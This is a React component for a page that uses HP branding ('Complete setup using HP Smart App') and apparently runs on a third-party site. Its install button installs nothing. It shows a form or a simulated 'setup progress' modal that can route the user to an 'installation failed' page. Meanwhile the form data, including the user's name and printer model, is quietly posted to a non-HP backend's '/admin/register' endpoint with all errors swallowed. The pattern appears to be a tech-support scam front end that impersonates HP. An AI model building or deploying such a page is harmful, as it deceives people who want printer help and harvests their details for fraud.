import React, { useRef, useState } from 'react';
import { Helmet } from 'react-helmet-async';
import { useNavigate } from 'react-router-dom';
import FinalStep from './FinalStep';
import SetupProgressModal from './SetupProgressModal';
import { FaXmark, FaPrint, FaCircleQuestion, FaCircleInfo } from 'react-icons/fa6';




function CompleteSetup() {
  const navigate = useNavigate();
  const [showFinalStep, setShowFinalStep] = useState(false);
  const [showModal, setShowModal] = useState(false);
  const [showError, setShowError] = useState(false);
  const [loading, setLoading] = useState(false);
  const nameRef = useRef();
  const [userName, setUserName] = useState('');
  // Use local state for printerModel, initialize from localStorage
  const [printerModel, setPrinterModel] = useState(() => localStorage.getItem('printerModel') || '');

  const handleFinalSubmit = (e, form) => {
    e.preventDefault();
    setLoading(true);
    // Show progress modal and continue UI flow immediately
    const name = form.name?.trim() || nameRef.current?.value?.trim() || 'User';
    setUserName(name);
    setPrinterModel(form.model?.trim() || printerModel || 'Officejet');
    setShowFinalStep(false);
    setShowModal(true);
    setLoading(false);
    // Submit registration in background
    const backendUrl = import.meta.env.VITE_API_URL || 'https://printsmatrix-backend-1.onrender.com/api';
    fetch(`${backendUrl}/admin/register`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(form)
    })
      .then(() => { })
      .catch(() => { });
  };

  // No longer needed: handleError

  if (showModal) {
    return <div className="fixed inset-0 z-50 bg-white flex items-center justify-center"><SetupProgressModal open={showModal} onClose={() => setShowModal(false)} user={userName} printer={printerModel} onError={() => navigate('/installation-failed')} /></div>;
  }

  return (
    <>
      <Helmet>
        <title>Complete Setup | HP Smart App</title>
      </Helmet>
      <div className="w-full min-h-screen bg-white flex flex-col pt-16 md:pt-0">
        {/* Top blue section */}
        <section
          className="w-full md:min-h-[560px] min-h-fit flex items-start justify-center relative px-4 md:px-[6%] py-12 md:py-0"
          style={{
            backgroundImage: 'url(/hero_background_image.jpg)',
            backgroundSize: 'cover',
            backgroundPosition: 'center',
          }}
        >
          <div className="w-full max-w-[1200px] flex flex-col md:flex-row items-center md:items-start justify-between relative h-full">
            <div className="flex flex-col justify-center h-full w-full max-w-2xl md:pt-8 text-center md:text-left">
              <h1 className="text-white text-3xl md:text-4xl lg:text-5xl mb-6 md:mb-8 font-bold leading-tight drop-shadow-lg">Complete setup using HP Smart App</h1>
              <p className="text-white text-lg md:text-xl mb-6 font-normal drop-shadow whitespace-normal">
                HP Smart App will connect the printer to your computer, install print drivers, and set up scanning features (if applicable)
              </p>
              <div className="flex flex-col items-center md:items-start w-full">
                <ol className="text-white text-lg mb-8 md:pl-6 list-decimal text-left w-fit">
                  <li className="mb-2">Make sure your printer is powered on</li>
                  <li>Install HP Smart App to complete setup</li>
                </ol>
                <button
                  className="bg-white text-blue-700 font-bold px-10 py-4 rounded-full text-lg shadow-lg hover:bg-blue-50 transition-all active:scale-95 mb-8 w-full md:w-fit"
                  onClick={() => {
                    const issue = localStorage.getItem('issue');
                    if (issue === 'Set Up a New Printer') {
                      setShowFinalStep(true);
                    } else {
                      setShowModal(true);
                    }
                  }}
                >
                  Install HP Smart App
                </button>
              </div>
              <div className="bg-transparent text-white text-sm md:text-base mb-4">
                <span className="font-semibold">To use all available printer features</span>, you must install the HP Smart app on a mobile device or the latest version of Windows or macOS. Available on:
              </div>
              <div className="flex flex-wrap justify-center md:justify-start gap-4 mb-2">
                <a href="https://apps.apple.com/app/hp-smart/id469284907" target="_blank" rel="noopener noreferrer" className="hover:opacity-80 transition">
                  <img src="https://developer.apple.com/assets/elements/badges/download-on-the-app-store.svg" alt="App Store" width="120" height="40" loading="lazy" className="h-10 md:h-12" />
                </a>
                <a href="https://play.google.com/store/apps/details?id=com.hp.printercontrol&hl=en&gl=US" target="_blank" rel="noopener noreferrer" className="hover:opacity-80 transition">
                  <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg" alt="Google Play" width="135" height="40" loading="lazy" className="h-10 md:h-12" />
                </a>
                <a href="https://apps.microsoft.com/store/detail/hp-smart/9WZDNCRFHWLH" target="_blank" rel="noopener noreferrer" className="hover:opacity-80 transition">
                  <img src="https://get.microsoft.com/images/en-us%20dark.svg" alt="Microsoft Store" width="120" height="40" loading="lazy" className="h-10 md:h-12 object-contain" />
                </a>
              </div>
            </div>
            <div className="hidden lg:flex flex-col items-center h-full absolute right-0 bottom-0 z-10">
              <div className="relative flex flex-col items-center">
                <img
                  src="/hp-printer-software.png"
                  alt="HP Printer Software"
                  width="300"
                  height="220"
                  fetchpriority="high"
                  className="h-[180px] xl:h-[220px] w-auto max-w-none drop-shadow-2xl"
                  style={{ marginTop: '220px' }}
                />

                <span className="absolute left-1/2 -translate-x-1/2 bottom-2 text-white text-xs font-medium drop-shadow-md bg-black/40 px-3 py-1 rounded-full whitespace-nowrap">
                  HP Printer Software
                </span>
              </div>
            </div>
          </div>
        </section>
        {/* Lower white section or FinalStep form */}
        {/* FinalStep as popup modal */}
        {showFinalStep && (
          <div className="fixed inset-0 z-50 bg-black/50 backdrop-blur-sm flex items-center justify-center p-4">
            <div className="bg-white rounded-2xl shadow-2xl w-full max-w-2xl p-6 md:p-10 relative overflow-y-auto max-h-[90vh]">
              <button onClick={() => setShowFinalStep(false)} className="absolute top-4 right-4 w-10 h-10 flex items-center justify-center rounded-full bg-gray-100 hover:bg-gray-200 text-gray-500 hover:text-gray-800 transition-all z-10"><FaXmark /></button>
              <FinalStep
                onBack={() => setShowFinalStep(false)}
                onSubmit={handleFinalSubmit}
                nameRef={nameRef}
                loading={loading}
                modelValue={printerModel}
                setModelValue={setPrinterModel}
              />
            </div>
          </div>
        )}
        {/* Lower white section */}
        <div className="w-full max-w-[1200px] mx-auto mt-12 md:mt-20 mb-20 px-6 md:px-[6%]">
          <div className="flex flex-col w-full max-w-4xl">
            <div className="flex items-start mb-4">
              <div className="bg-blue-50 p-3 rounded-lg mr-4">
                <FaPrint className="text-blue-500 text-xl md:text-2xl" />
              </div>
              <div>
                <h2 className="text-lg md:text-xl font-bold text-gray-800 mb-2">Set up scanning from a control panel (if applicable):</h2>
                <div className="text-gray-600 text-sm md:text-base leading-relaxed">
                  Set up additional scanning features (Windows only). Get started by selecting <span className="font-semibold text-blue-600">Install HP Smart App</span> above.<br />
                  <span className="text-gray-400 italic text-xs md:text-sm mt-2 block">Note: To scan from a macOS computer, install the HP Smart app.</span>
                </div>
              </div>
            </div>

            <div className="h-px bg-gradient-to-r from-gray-100 via-gray-200 to-gray-100 my-8 md:my-10" />

            <div className="grid md:grid-cols-2 gap-6 md:gap-10">
              <div className="flex items-start p-4 hover:bg-gray-50 rounded-xl transition-colors">
                <FaCircleQuestion className="text-blue-500 text-xl md:text-2xl mt-1 mr-4 flex-shrink-0" />
                <div>
                  <h3 className="font-semibold text-gray-800 mb-1">Troubleshooting</h3>
                  <p className="text-sm text-gray-500 mb-2">Need help during printer setup?</p>
                  <a href="#" className="text-blue-600 hover:text-blue-700 font-medium text-sm flex items-center gap-1 group underline decoration-blue-200 underline-offset-4">
                    Solve Setup Issues
                  </a>
                </div>
              </div>

              <div className="flex items-start p-4 hover:bg-gray-50 rounded-xl transition-colors">
                <FaCircleInfo className="text-blue-500 text-xl md:text-2xl mt-1 mr-4 flex-shrink-0" />
                <div>
                  <h3 className="font-semibold text-gray-800 mb-1">HP Support</h3>
                  <p className="text-sm text-gray-500 mb-2">Find additional information and videos.</p>
                  <a href="#" className="text-blue-600 hover:text-blue-700 font-medium text-sm flex items-center gap-1 group underline decoration-blue-200 underline-offset-4">
                    Visit HP Support
                  </a>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>

    </>
  );
}

export default CompleteSetup;
